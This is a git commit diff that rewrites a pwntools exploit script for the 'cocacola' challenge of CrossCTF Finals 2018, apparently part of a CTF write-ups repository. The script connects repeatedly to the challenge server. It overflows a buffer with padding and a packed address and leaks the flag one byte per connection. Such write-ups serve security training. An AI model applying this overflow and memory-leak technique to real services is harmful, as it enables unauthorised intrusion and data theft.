5928eb2a944ea41bbade0472e80ac5a1692a4a1b
Enigmatrix <enigmatrix2000@gmail.com>
2018-06-18 11:52:54 +0800

    writeup for cocacola and change the solution to be a bit more friendly

--- writeups/crossctf-finals2018/pwn/cocacola/cocacola.py
+++ writeups/crossctf-finals2018/pwn/cocacola/cocacola.py
@@ -1,18 +1,16 @@
 from pwn import *
-
-
-for i in range(32):
-
-    p = remote('ctf.pwn.sg', 4001)
-
-    pause()
-    p.sendafter("Do you want to flip the flag switch? (y/n) ", '\x44\xC5')
-    p.send(p64(0x700B1000+i*32)*(0xff/8+1))
-
-    pause()
-    p.send("\x00\n")
-
-    p.recvuntil('Error: ')
-    print(p.recv(1))
-
-
+ 
+s = ''
+  
+for i in range(50):
+    try:
+        p = remote('ctf.pwn.sg', 4001)
+  
+        p.sendafter("Do you want to flip the flag switch? (y/n) ", '\x44\xC5')
+        p.send('a'*0xf8+p64(0x700B1000+i*32)[:-1])
+        p.send('\x00')
+        p.recvuntil('Error: ')
+        s += p.recv(1)
+    except:
+        break
+print(s)
